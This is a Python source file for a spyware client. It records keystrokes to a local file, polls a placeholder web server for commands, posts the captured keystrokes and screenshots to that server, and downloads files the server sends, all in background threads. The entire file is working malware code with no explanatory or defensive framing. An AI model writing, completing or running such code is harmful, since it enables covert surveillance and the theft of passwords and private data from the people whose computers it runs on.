from pynput import keyboard
import threading
import requests
import time
from PIL import ImageGrab
import io
#----------------------------------------------------------------------
BASE_URL = "web server here"
def on_press(key):
    try:
        # Try to get the printable character
        log = key.char
#        hook.send(log) #slow
#error handler
    except AttributeError:
        return
    # Save to file
    with open("keylog.txt", "a") as file:
        file.write(log)
#----------------------------------------------------------------------
def event_listener():
    # Start the key listener
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
#----------------------------------------------------------------------
def send():
    while True:
        with open("keylog.txt", "r") as file:
            content = file.read()
        if not content.strip():
            time.sleep(5)
            continue
        # data = "hello world test!"
        requests.post(f"{BASE_URL}/page", json={"log": content})
        with open("keylog.txt", "r+") as con:
            con.seek(0)
            con.truncate()
        time.sleep(100)


def ss_command1():
    try:
        res = requests.get(f"{BASE_URL}/page")
        time.sleep(50)
        data = res.json()
        if data.get("send_logs"):
            send()
    except Exception as c:
        print(f"[1]Error: {c}")
        time.sleep(100)

#----------------------------------------------------------------------
def receiver(): #short polling
    while True:
        try:
            r = requests.get(f"{BASE_URL}/page")
            time.sleep(50)
            if r.status_code == 200:
                # filename from server header or fallback
                filename = r.headers.get("Content-Disposition", "").split("filename=")[-1].strip('"') \
                    if "filename=" in r.headers.get("Content-Disposition", "") else "latest_file"
                with open(filename, 'wb') as f:
                    for chunk in r.iter_content(chunk_size=8192):
                        if chunk:
                            f.write(chunk)
                print(f"File received and saved as {filename}")
                time.sleep(100)
        except Exception as d:
            print(f"[2]Error: {d}")
            time.sleep(100)
#________________________________________________________
def screenshot():
    # Capture screenshot
    ss = ImageGrab.grab()
    buffer = io.BytesIO()
    ss.save(buffer, format="PNG")
    buffer.seek(0)
    # send to your own webserver
    requests.post(f"{BASE_URL}/page", files={"file": (f"{int(time.time())}.png", buffer)})

def ss_command2():
    try:
        res = requests.get(f"{BASE_URL}/page")
        time.sleep(50)
        data = res.json()
        if data.get("take_screenshot"):
            screenshot()
    except Exception as e:
        print(f"[3]Error: {e}")
        time.sleep(100)
#________________________________________________________
#thread1 = threading.Thread(target=event_listener, daemon=True)
thread2 = threading.Thread(target=receiver, daemon=True)
thread3 = threading.Thread(target=ss_command1, daemon=True)
thread4 = threading.Thread(target=ss_command2, daemon=True)
    # Start the threads
#thread1.start()
thread2.start()
thread3.start()
thread4.start()
while True:
     pass







